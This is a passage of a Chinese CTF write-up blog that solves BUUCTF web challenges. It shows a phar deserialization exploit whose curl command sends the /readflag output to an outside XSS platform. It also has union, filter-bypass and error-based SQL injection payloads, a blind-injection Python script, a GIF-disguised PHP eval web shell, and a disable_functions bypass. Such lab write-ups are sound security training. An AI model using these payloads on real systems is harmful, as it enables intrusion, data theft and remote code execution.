in contents!"</span>);  <span class="comment">//不能包含<span class="meta">&lt;?</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/media/media_mimeref.asp" target="_blank" rel="noopener">关于MME类型文件</a>   上传的文件要绕过Check::check()</p>
<p>finfo_file会触发phar的反序列化<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a>     <a href="https://xz.aliyun.com/t/2958" target="_blank" rel="noopener">参考文章2</a></p>
<p>传入成功后url</p>
<p>phar://开头被正则过滤，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=1&amp;cmd=curl --referer "`/readflag`" --insecure "http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK"&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> File();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'poc.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a __HALT_COMPILER();"</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的poc.phar改一个图片文件后缀，然后上传</p>
<p>再func.php里面提交url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;2c67ca1eaeadbdc1868d67003072b481&#x2F;551ccbaef945b2c4f3ca88361f08d600.jpg</span><br></pre></td></tr></table></figure>

<p>关于构造SoapClient当中的cmd命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; --insecure &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;dzWPkK&quot;</span><br></pre></td></tr></table></figure>

<p>因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值</p>
<p>附上出题人<a href="https://xz.aliyun.com/t/6057" target="_blank" rel="noopener">出题笔记</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>suctf2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录10-极客大挑战web2</title>
    <url>/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web2/</url>
    <content><![CDATA[<h2 id="极客大挑战web"><a href="#极客大挑战web" class="headerlink" title="极客大挑战web"></a>极客大挑战web</h2><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误</p>
<p>常规操作</p>
<a id="more"></a>

<ol>
<li><h4 id="order-by判断字段，字段为3"><a href="#order-by判断字段，字段为3" class="headerlink" title="order by判断字段，字段为3"></a>order by判断字段，字段为3</h4></li>
</ol>
<p><img src="/pic/38.png" alt=""></p>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code></p>
<p><img src="/pic/39.png" alt=""></p>
<ol start="2">
<li><h4 id="union确定回显，回显位置为2，3"><a href="#union确定回显，回显位置为2，3" class="headerlink" title="union确定回显，回显位置为2，3"></a>union确定回显，回显位置为2，3</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,2,3+%23&amp;password=123</code></p>
<p><img src="/pic/40.png" alt=""></p>
<ol start="3">
<li><h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,database(),3+%23&amp;password=123</code></p>
<p><img src="/pic/41.png" alt=""></p>
<ol start="4">
<li><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;+%23&amp;password=123</code></p>
<p><img src="/pic/42.png" alt=""></p>
<p>l0ve1ysq1、geekuser</p>
<ol start="5">
<li><h4 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;l0ve1ysq1&#39;+%23&amp;password=123</code></p>
<p><img src="/pic/43.png" alt=""></p>
<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;geekuser&#39;+%23&amp;password=123</code></p>
<p><img src="/pic/44.png" alt=""></p>
<ol start="6">
<li><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+geekuser+limit+0,1+%23&amp;password=123</code></p>
<p>geekuser只有一个admin</p>
<p><img src="/pic/45.png" alt=""></p>
<p>l0ve1ysq1表中发现了flag</p>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code> </p>
<p><img src="/pic/46.png" alt=""></p>
<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>fuzzing一下，将union,select,and,or,where,from删除</p>
<p>此时可以selselectect将select删除之后就变成了sel <del>select</del> ect</p>
<p>因为和上面的一样，直接查询数据库</p>
<ol>
<li><h4 id="查数据库-1"><a href="#查数据库-1" class="headerlink" title="查数据库"></a>查数据库</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,database(),3--+&amp;password=123</code></p>
<p>数据库名还是geek</p>
<ol start="2">
<li><h4 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h4></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;&#39;uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema&#x3D;&#39;geek&#39;--+&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>

<p>b4bsql,geekuser</p>
<ol start="3">
<li><h4 id="查列名-1"><a href="#查列名-1" class="headerlink" title="查列名"></a>查列名</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema=&#39;geek&#39;+anandd+table_name=&#39;b4bsql&#39;--+&amp;password=123</code></p>
<p>列名还是id,username,password</p>
<ol start="4">
<li><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&amp;password=123</code></p>
<p><img src="/pic/47.png" alt=""></p>
<p>成功拿到flag</p>
<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>打开BP，开启拦截，查看site map发现有一个secret.php</p>
<p><img src="/pic/48.png" alt=""></p>
<p>访问即可</p>
<p>根据提示修改http头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:27400</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">X-Forwarded-for:127.0.0.1</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">Referer:https://www.Sycsecret.com</span></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>点进去有一个payflag界面,</p>
<p>根据提示，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!! </span><br><span class="line"></span><br><span class="line">Only Cuit's students can buy the FLAG</span><br></pre></td></tr></table></figure>

<p>页面最后有一段注释</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	~~~post money and password~~~</span></span><br><span class="line"><span class="comment">if (isset($_POST['password'])) &#123;</span></span><br><span class="line"><span class="comment">	$password = $_POST['password'];</span></span><br><span class="line"><span class="comment">	if (is_numeric($password)) &#123;</span></span><br><span class="line"><span class="comment">		echo "password can't be number&lt;/br&gt;";</span></span><br><span class="line"><span class="comment">	&#125;elseif ($password == 404) &#123;</span></span><br><span class="line"><span class="comment">		echo "Password Right!&lt;/br&gt;";</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一段注释是对输入的<code>password</code>作比较，输入的是404，且能绕过<code>is_numeric()</code>函数。</p>
<p>在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的</p>
<p><img src="/pic/49.png" alt=""></p>
<p>抓包发现有cookie, user=0，改成=1，变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Please input your password!!</span><br></pre></td></tr></table></figure>

<p>传入数据<code>password=404a&amp;money=999999999</code>，他说数据太长，只能传入八位。</p>
<p>之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过</p>
<p><code>password=404a&amp;money[]=</code></p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>上传PHP一句话被过滤</p>
<p><img src="/pic/50.png" alt=""></p>
<p>换成图片后缀jpg进行%00截断，还是被过滤</p>
<p><img src="/pic/51.png" alt=""></p>
<p>尝试php2,php3,php5都被过滤</p>
<p><img src="/pic/52.png" alt=""></p>
<p><img src="/pic/53.png" alt=""></p>
<p><img src="/pic/54.png" alt=""></p>
<p>只有phtml没有被过滤</p>
<p><img src="/pic/55.png" alt=""></p>
<p>内容不能出现<code>&lt;?</code>可以换成js的写法</p>
<p><img src="/pic/56.png" alt=""></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>再上传提示必须是图片，添加gif文件头<code>GIF89a</code></p>
<p><img src="/pic/57.png" alt=""></p>
<p>使用蚁剑，菜刀连接，找到flag</p>
<p><img src="/pic/58.png" alt=""></p>
<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p>fuzz测试</p>
<p><code>AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&amp;&amp;,&lt;,&gt;,ascii,%20,%09</code>被过滤</p>
<p>输入错误还会报出sql语句错误，考虑报错注入</p>
<ol>
<li><h4 id="查数据库-2"><a href="#查数据库-2" class="headerlink" title="查数据库"></a>查数据库</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(database())),0))%23</code>还是geek</p>
</li>
<li><h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0))%23</code></p>
<p>H4rDsq1</p>
</li>
<li><h4 id="查列名（应该还是只有id-usname-password）"><a href="#查列名（应该还是只有id-usname-password）" class="headerlink" title="查列名（应该还是只有id,usname,password）"></a>查列名（应该还是只有id,usname,password）</h4></li>
<li><h4 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
<p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
<p>因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。</p>
</li>
</ol>
<h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p>fuzz之后发现被过滤的关键字有</p>
<p><img src="/pic/59.png" alt=""></p>
<p>题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框</p>
<p><img src="/pic/60.png" alt=""></p>
<p><img src="/pic/61.png" alt=""></p>
<p>根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('</span>+payload+<span class="string">')'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'others'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">(db)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tabls('geek') #F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># get_columns('F1naI1y') # id,username,password</span></span><br><span class="line"><span class="comment"># get_columns('Flaaaaag') # id,fl4gawsl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_data('fl4gawsl','Flaaaaag')</span></span><br><span class="line">get_data(<span class="string">'id,username,password'</span>,<span class="string">'F1naI1y'</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来有两个表F1naI1y,Flaaaaag</p>
<p>F1naI1y表还是只有id,username,password</p>
<p>Flaaaaag表包括id,fl4gawsl</p>
<h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p>打开题目有源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;  </span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p> 传入一个code参数，长度不能大于40，不能包含大小写字母和数字</p>
<p>可以使用取反或者异或拼凑函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~?&gt;);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;_&#x3D;phpinfo()&amp;__&#x3D;assert</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%A0%AF%B0%AC%AB是_GET的取反的值，$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;)&#96;就相当于 $_GET&#123;&#39;__&#39;&#125;($_GET&#123;&#39;_&#39;&#125;)   联合起来就是assert(phpinfo())</span><br></pre></td></tr></table></figure>



<p>关于assert函数**</p>
<p>PHP 5 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</p>
<p>PHP 7 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</p>
<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <strong><code>FALSE</code></strong> 时采取适当的行动。</p>
<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a href="https://www.php.net/manual/zh/function.assert-options.php" target="_blank" rel="noopener">assert_options()</a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>
<p><img src="/pic/64.png" alt=""></p>
<p>先查看phpinfo()</p>
<p><img src="/pic/62.png" alt=""></p>
<p>禁用了很多执行系统命令的函数</p>
<p><img src="/pic/63.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>

<p>扫描当前目录 </p>
<p>post 数据： <code>_=print_r(scandir(%27./%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array (    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>

<p>扫描根目录</p>
<p>post数据：<code>_=print_r(scandir(%27/%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var )</span><br></pre></td></tr></table></figure>

<p>发现有一个flag文件和一个readflag文件。尝试读取内容</p>
<p>读取flag中的文件是空的；</p>
<p>post数据：<code>_=var_dump(file_get_contents(%27/flag%27))&amp;__=assert</code></p>
<p>post数据：<code>_=var_dump(file_get_contents(%27/readflag%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(8856) &quot;ELF&gt;�@�@8 @@@@��888  � � � x� � � � ��TTTDDP�td���&lt;&lt;Q�tdR�td� � � ((&#x2F;lib64&#x2F;ld-linux-x86-64.so.2GNU GNU�íf­CI�&#96;[Xa���V�Q ?m 8| � )&quot;!libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5ui �� �� &#96;H H � � � � � �     ( 0  8 H��H�� H��t��H����5� �%� @�%� h������%� h������%� h������%� h�����%� h�����%b f�1�I��^H��H���PTL��H� sH�&#x3D;� �DH�&#x3D;y H�y UH)�H��H��vH�� H��t ]��fD]�@f.�H�&#x3D;9 H�52 UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��&#x3D;� u&#39;H�&#x3D;� UH��tH�&#x3D;� � ����H���]�� ��@f.�H�&#x3D;A H�?u�^���fDH�) H��t�UH����]�@���UH����������~������_������@���H�&#x3D;�������]�f.�f�AWAVA��AUATL�%� UH�-� SI��I��L)�H��H������H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���&#x2F;bin&#x2F;cat &#x2F;flag;8l�������������T����l��������,zRx�����+zRx�$����&#96;FJw�?;*3$&quot;D���\@���TA�C OD|����eB�B�E �B(�H0�H8�M@r8A0A(B BBB������&#96; �� � ���o��� � x��� ���o���o����o���o����o� FVfv�H GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 201705168Tt����� � �0 ����� � � � � �  @ P ��� �.&#96;DP S� z��� ������ �� ���� �� �� ��  �0 � @ LP *�Sg�@ � �H ���0e�X ��+�P ��T�� P  -A&quot;�]rcrtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment88#TT 1tt$D���o��N�� V���^���o��k���o�� z����B��x��00&#96;��������� ������&lt;� �� � �� � �� � �� � ��� �0� @�@ @�P P0P-��&#x2F; @��&quot;</span><br></pre></td></tr></table></figure>

<p>是linux可执文件</p>
<p>连接蚁剑 payload :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;cmd&#39;])</span><br></pre></td></tr></table></figure>

<p>应该是要绕过disable_function,从而执行readflag，项目地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p>只有/tmp有文件修改权限，上传<code>bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so</code>到/tmp下</p>
<p>最后payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;include &quot;&#x2F;tmp&#x2F;bypass_disablefunc.php&quot;&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>输出为</p>
